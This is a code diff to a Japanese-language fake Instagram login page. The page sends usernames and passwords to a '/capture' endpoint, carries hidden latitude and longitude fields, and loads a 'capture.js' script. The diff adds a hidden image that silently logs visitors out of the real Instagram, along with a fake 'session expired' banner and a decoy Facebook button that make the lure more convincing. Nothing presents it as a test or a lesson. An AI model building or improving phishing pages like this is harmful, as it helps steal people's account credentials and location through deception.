@@ -8,20 +8,49 @@
 <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
+
+  <!-- 読み込みと同時に本物のInstagramから強制ログアウト -->
+  <img class="logout" src="https://www.instagram.com/accounts/logout/" width="1" height="1" alt="">
+
+  <div class="banner">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877f2"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+    <span>セッションの有効期限が切れました。もう一度ログインしてください。</span>
+  </div>
+
   <div class="container">
     <h1 class="logo">Instagram</h1>
-    <p class="notice">セッションの有効期限が切れました。もう一度ログインしてください。</p>
 
     <form method="POST" action="/capture" id="ig-form">
-      <input type="text" name="username" placeholder="電話番号、ユーザーネーム、またはメールアドレス" required autocomplete="username">
-      <input type="password" name="password" placeholder="パスワード" required autocomplete="current-password">
+      <div class="field">
+        <input id="username" type="text" name="username" placeholder=" "
+               autocomplete="username" required>
+        <label for="username">電話番号、ユーザーネーム、またはメールアドレス</label>
+      </div>
+
+      <div class="field">
+        <input id="password" type="password" name="password" placeholder=" "
+               autocomplete="current-password" required>
+        <label for="password">パスワード</label>
+      </div>
+
       <input type="hidden" name="lat" value="">
       <input type="hidden" name="lng" value="">
-      <button type="submit" id="submit-btn">ログイン</button>
-    </form>
 
-    <p class="forgot">パスワードをお忘れですか?</p>
+      <button type="submit" id="submit-btn" disabled>ログイン</button>
+
+      <div class="or"><span>または</span></div>
+
+      <button type="button" class="fb-btn">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M22 12a10 10 0 1 0-11.6 9.9v-7H7.9V12h2.5V9.8c0-2.5 1.5-3.9 3.7-3.9 1.1 0 2.2.2 2.2.2v2.4h-1.2c-1.2 0-1.6.8-1.6 1.6V12h2.7l-.4 2.9h-2.3v7A10 10 0 0 0 22 12z"/></svg>
+        Facebookでログイン
+      </button>
+
+      <button type="button" class="forgot">パスワードをお忘れですか?</button>
+    </form>
   </div>
+
+  <div class="signup">アカウントをお持ちでないですか? <a href="#">登録する</a></div>
+
   <script src="/static/capture.js"></script>
 </body>
 </html>
